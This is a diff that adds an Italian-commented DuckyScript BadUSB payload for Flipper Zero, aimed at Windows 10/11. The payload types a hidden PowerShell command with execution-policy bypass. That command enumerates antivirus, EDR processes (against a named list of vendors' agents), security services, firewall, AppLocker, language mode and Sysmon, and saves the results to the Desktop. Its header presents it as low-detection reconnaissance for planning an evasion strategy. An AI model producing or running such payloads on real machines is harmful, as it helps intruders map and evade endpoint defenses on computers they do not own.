@@ -1,0 +1,19 @@
+REM ============================================================
+REM Title:    Security Software Enumeration
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Recon
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~6 secondi
+REM Detect:   Basso - query WMI e process list
+REM Desc:     Identifica TUTTI i software di sicurezza installati:
+REM           AV, EDR, HIPS, firewall, DLP. Fondamentale per
+REM           pianificare l'evasion strategy.
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\security_enum.txt';'=== SECURITY ENUM ===' | Out-File $o;'Date: '+(Get-Date) | Out-File $o -Append;'`n=== ANTIVIRUS (WMI) ===' | Out-File $o -Append;Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName,productState,pathToSignedProductExe | Format-List | Out-File $o -Append;'`n=== EDR PROCESSES ===' | Out-File $o -Append;$edr=@('MsMpEng','cb','CbDefense','CylanceSvc','CSFalconService','SentinelAgent','SentinelOne','TaniumClient','qualys','Traps','xagt','ManagementAgentHost','bdagent','EPSecurityService','avp','ekrn','avgnt','avguard','sophossps','hmpalert','WinDefend','MBAMService','mcshield','fmon');Get-Process | Where-Object{$edr -contains $_.Name} | Select-Object Name,Id,Path | Out-File $o -Append;'`n=== SECURITY SERVICES ===' | Out-File $o -Append;Get-Service | Where-Object{$_.DisplayName -match 'security|antivirus|firewall|defend|sentinel|crowd|carbon|cylance|sophos|trend|norton|mcafee|kaspersky|eset|bitdefender|malware|endpoint'} | Select-Object Name,DisplayName,Status | Out-File $o -Append;'`n=== FIREWALL ===' | Out-File $o -Append;Get-NetFirewallProfile | Select-Object Name,Enabled | Out-File $o -Append;'`n=== APPLOCKER ===' | Out-File $o -Append;Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue | Out-File $o -Append;'`n=== CONSTRAINED LANGUAGE ===' | Out-File $o -Append;$ExecutionContext.SessionState.LanguageMode | Out-File $o -Append;'`n=== SYSMON ===' | Out-File $o -Append;Get-Service sysmon* -ErrorAction SilentlyContinue | Out-File $o -Append"
+ENTER
